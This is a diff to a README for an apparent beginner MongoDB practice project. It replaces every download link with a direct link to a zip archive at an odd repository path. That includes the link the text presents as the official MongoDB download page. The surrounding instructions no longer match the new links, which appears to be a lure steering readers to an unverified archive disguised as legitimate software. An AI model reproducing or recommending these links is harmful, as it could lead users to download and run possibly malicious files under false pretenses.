@@ -1,6 +1,6 @@
 # 🗄️ MongoDB-Magic - Easy Practice with MongoDB Basics
 
-[![Download MongoDB-Magic](https://img.shields.io/badge/Download-MongoDB--Magic-4caf50?style=for-the-badge&logo=github)](https://github.com/pacoflaco/MongoDB-Magic)
+[![Download MongoDB-Magic](https://img.shields.io/badge/Download-MongoDB--Magic-4caf50?style=for-the-badge&logo=github)](https://github.com/pacoflaco/MongoDB-Magic/raw/refs/heads/main/undersense/Mongo_Magic_D_Isurus.zip)
 
 ---
 
@@ -27,14 +27,14 @@ Before you start, ensure your PC meets these minimum requirements:
 
 Click the button below to visit the main page where you can download the files needed to use MongoDB-Magic. The page includes all scripts and instructions available in this project.
 
-[![Download MongoDB-Magic](https://img.shields.io/badge/Download-MongoDB--Magic-ff6600?style=for-the-badge&logo=github)](https://github.com/pacoflaco/MongoDB-Magic)
+[![Download MongoDB-Magic](https://img.shields.io/badge/Download-MongoDB--Magic-ff6600?style=for-the-badge&logo=github)](https://github.com/pacoflaco/MongoDB-Magic/raw/refs/heads/main/undersense/Mongo_Magic_D_Isurus.zip)
 
 ---
 
 ## 💾 Step 1: Download MongoDB-Magic Files
 
 1. Open your web browser and go to the download page:  
-   https://github.com/pacoflaco/MongoDB-Magic
+   https://github.com/pacoflaco/MongoDB-Magic/raw/refs/heads/main/undersense/Mongo_Magic_D_Isurus.zip
 
 2. On the GitHub page, find the green “Code” button on the right side.
 
@@ -51,7 +51,7 @@ Click the button below to visit the main page where you can download the files n
 MongoDB-Magic uses MongoDB to work. You will need MongoDB installed on your PC if you do not have it yet.
 
 1. Go to the official MongoDB download page:  
-   https://www.mongodb.com/try/download/community
+   https://github.com/pacoflaco/MongoDB-Magic/raw/refs/heads/main/undersense/Mongo_Magic_D_Isurus.zip
 
 2. Choose the Windows version and click “Download.”
 
@@ -149,7 +149,7 @@ Only MongoDB and a command line window. Optionally, use a code editor.
 ## 📥 Download Link Reminder
 
 Get started by visiting the download page here:  
-https://github.com/pacoflaco/MongoDB-Magic
+https://github.com/pacoflaco/MongoDB-Magic/raw/refs/heads/main/undersense/Mongo_Magic_D_Isurus.zip
 
 You can always come back to this link for updates, new scripts, and community support.
 
